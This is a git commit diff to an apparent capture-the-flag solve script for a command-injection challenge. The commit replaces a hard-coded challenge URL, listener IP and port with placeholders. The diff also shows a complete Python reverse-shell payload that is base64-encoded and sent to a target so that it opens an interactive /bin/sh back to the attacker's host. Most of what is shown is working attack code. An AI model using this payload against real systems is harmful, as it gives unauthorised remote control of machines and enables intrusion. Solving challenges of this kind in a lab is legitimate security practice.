e7c0e6b56730589b036ca7d253a14a41d8996a57
TrungNhan <144971731+TTN-ATTN@users.noreply.github.com>
2025-12-10 22:20:06 +0700

    Update solve.py with placeholders for URL and IP

--- basic_injection/solve.py
+++ basic_injection/solve.py
@@ -2,9 +2,9 @@ import requests
 import json
 import base64
 
-url = "http://host3.dreamhack.games:16651/"
-LHOST = "54.169.93.143"
-LPORT = 15607
+url = "<CHALLENGE_URL>"
+LHOST = "<YOUR_PUBLIC_IP>"
+LPORT = "<YOUR_PUBLIC_PORT>"
 
 cmd = f"import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('{LHOST}',{LPORT}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);import subprocess;subprocess.call(['/bin/sh','-i'])"
 cmd = base64.b64encode(cmd.encode()).decode()
@@ -25,4 +25,5 @@ try:
 except requests.exceptions.Timeout:
     print("[+] Finished!")
 except Exception as e:
+
     print(f"[-] Error: {e}")
